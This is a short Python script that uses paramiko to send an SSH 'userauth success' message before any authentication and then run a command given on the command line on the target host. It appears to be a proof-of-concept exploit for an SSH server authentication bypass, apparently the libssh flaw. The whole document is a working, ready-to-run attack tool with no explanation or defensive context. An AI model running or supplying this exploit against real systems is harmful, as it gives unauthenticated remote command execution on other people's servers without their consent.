#!/usr/bin/env python

import sys
import socket
import paramiko

def main(hostname,port,cmd):

	try:

		s = socket.socket()
		s.connect((str(hostname),int(port)))
		msg = paramiko.message.Message()
		msg.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
		paramiko.util.log_to_file("filename.log")
		trans = paramiko.transport.Transport(s)
		trans.packetizer.REKEY_BYTES = pow(2, 40)
		trans.packetizer.REKEY_PACKETS = pow(2, 40)
		trans.start_client(timeout=5)
		trans._send_message(msg)
		session = trans.open_session(timeout=10)
		session.exec_command(cmd)
		out_file = session.makefile("rb",4096)
		output = out_file.read()
		print output
		out_file.close()
		s.close()
		return 
	except Exception as e:
		print "Error"
		print e
		return
	

if __name__ == "__main__":
	try:
		hostname = sys.argv[1]
		port = sys.argv[2]
		cmd = sys.argv[3]
		main(hostname,port,cmd)
	except Exception as e:
		print "Usage: <script.py> <hostname> <port> <command>"
		exit()